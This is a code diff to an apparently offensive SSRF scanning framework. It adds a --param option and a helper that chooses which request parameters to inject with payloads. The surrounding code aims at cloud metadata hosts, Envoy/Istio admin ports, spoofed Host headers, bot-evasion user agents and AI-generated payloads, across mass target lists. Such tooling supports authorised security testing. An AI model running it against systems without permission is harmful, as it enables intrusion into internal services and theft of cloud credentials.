@@ -138,6 +138,7 @@ def setup_argparse():
     target_group.add_argument("--target", "-t")
     target_group.add_argument("--targets")
     target_group.add_argument("--target-file", "-f")
+    parser.add_argument("--param", help="Specific parameter to test on a single target. Only supported with --target.")
     parser.add_argument("--callback", "-c")
     parser.add_argument("--collaborator")
     parser.add_argument("--burp-collaborator")
@@ -565,6 +566,7 @@ class UltimateSSRFFramework:
         self.delay = args.delay
         self.verbose = not args.quiet
         self.headless = not args.visible
+        self.user_param = getattr(args, "param", None)
         self.proxy = args.proxy
         self.proxy_file = args.proxy_file
         self.proxy_type = args.proxy_type
@@ -828,6 +830,22 @@ class UltimateSSRFFramework:
             }
         except Exception: pass
 
+    def _params_for_endpoint(self, ep, fallback=None):
+        if self.user_param:
+            return [self.user_param]
+
+        params = list(ep.params) if ep.params else []
+
+        if fallback:
+            for item in fallback:
+                if item not in params:
+                    params.append(item)
+
+        if not params:
+            params = ["url"]
+
+        return params
+
     def _find_callback_context(self, request_host):
         request_host = (request_host or "").lower()
         for payload_host, ctx in self.callback_context.items():
@@ -838,7 +856,7 @@ class UltimateSSRFFramework:
     async def basic(self):
         if self.verbose: print(f"\n{CYAN}[BASIC]{RESET} Common SSRF parameters...")
         for ep in self.endpoints[:5]:
-            for param in ["url","uri","file","path","redirect"]:
+            for param in self._params_for_endpoint(ep, fallback=["url", "uri", "file", "path", "redirect"]):
                 payload = self.make_callback_url("basic")
                 await self.test_payload(ep, param, payload, "Basic", f"param {param}")
 
@@ -885,7 +903,7 @@ class UltimateSSRFFramework:
         if self.verbose: print(f"\n{PURPLE}[Service Mesh SSRF]{RESET} Envoy/Istio admin...")
         targets = ["http://localhost:15000/", "http://127.0.0.1:15000/", "http://localhost:15020/"]
         for ep in self.endpoints[:5]:
-            for param in list(ep.params)[:3] + ["url"]:
+            for param in self._params_for_endpoint(ep, fallback=["url"])[:4]:
                 for t in targets:
                     await self.test_payload(ep, param, t, "Mesh", f"Admin port")
 
@@ -904,7 +922,7 @@ class UltimateSSRFFramework:
 
             if self.endpoints:
                 ep = self.endpoints[0]
-                param = list(ep.params)[0] if ep.params else "url"
+                param = self._params_for_endpoint(ep)[0]
                 payload = self.make_callback_url("bot")
                 await self.test_payload(ep, param, payload, "Bot Evasion", f"UA:{ua[:20]}...")
             await ctx.close()
@@ -919,9 +937,10 @@ class UltimateSSRFFramework:
             {"Host": "metadata.google.internal"},
         ]
         for ep in self.endpoints[:5]:
-            for h in headers_list:
-                payload = self.make_callback_url("ingress")
-                await self.test_payload(ep, "url", payload, "K8s Ingress", f"Header {h}", extra_headers=h)
+            for param in self._params_for_endpoint(ep, fallback=["url"])[:4]:
+                for h in headers_list:
+                    payload = self.make_callback_url("ingress")
+                    await self.test_payload(ep, param, payload, "K8s Ingress", f"Header {h}", extra_headers=h)
 
 
     async def run_ai_phases(self):
@@ -933,13 +952,14 @@ class UltimateSSRFFramework:
             "cloud": ",".join(self.cloud),
             "callback_host": self._callback_host(),
             "endpoints": [e.path for e in self.endpoints[:5]],
-            "params": sorted(list(self.params))[:20],
+            "params": [self.user_param] if self.user_param else sorted(list(self.params))[:20],
+            "user_param": self.user_param,
         }
         payloads = await self.ai.generate_payloads(context)
         ai_payloads = getattr(self.ai, "last_llm_payloads", [])
         if payloads and self.endpoints:
             ep = self.endpoints[0]
-            param = list(ep.params)[0] if ep.params else "url"
+            param = self._params_for_endpoint(ep)[0]
             for payload in payloads[:10]:
                 await self.test_payload(ep, param, payload, "AI-Generated", "AI Payload")
 
@@ -1293,6 +1313,8 @@ body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px}.header{backgr
 async def main():
     parser = setup_argparse()
     args = parser.parse_args()
+    if args.param and not args.target:
+        parser.error("--param can only be used with --target. For mass scanning, omit --param and let the framework discover parameters automatically.")
     print(BANNER)
 
     targets = TargetManager.from_args(args)
